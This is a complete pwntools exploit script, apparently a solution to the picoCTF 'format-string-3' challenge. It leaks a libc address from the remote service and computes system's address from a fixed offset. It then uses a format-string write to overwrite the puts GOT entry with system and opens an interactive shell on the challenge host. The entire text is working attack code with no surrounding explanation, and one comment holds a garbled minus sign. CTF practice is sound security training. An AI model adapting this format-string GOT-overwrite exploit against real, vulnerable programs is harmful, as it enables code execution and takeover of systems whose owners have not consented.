from pwn import *

context.binary = elf = ELF("./format-string-3", checksec=False)
context.log_level = "Error"


def exec_fmt(payload):
    p = process()
    p.sendline(payload)
    return p.recvall()


fmt = FmtStr(exec_fmt)
offset = fmt.offset
print("offset : ", offset)

# ====================================================================
# Difference between system and setvbuf
# pwndbg> x/gx &system
# 0x7ffff7e2f760 <system>:	0x74ff8548fa1e0ff3
# pwndbg> x/gx &setvbuf
# 0x7ffff7e5a3f0 <setvbuf>:	0x55415641fa1e0ff3
# diff = 0x7ffff7e5a3f0 âˆ’ 0x7ffff7e2f760
# ====================================================================

diff = 0x2AC90

# io = process()
io = remote("rhea.picoctf.net", 61519)

io.recvuntil(b"libc: ")
leak = int(io.recvline(), 16)

system_addr = leak - diff
target = elf.got.puts

writes = {target: system_addr}
payload = fmtstr_payload(offset, writes, write_size="byte")

io.sendline(payload)
io.interactive()
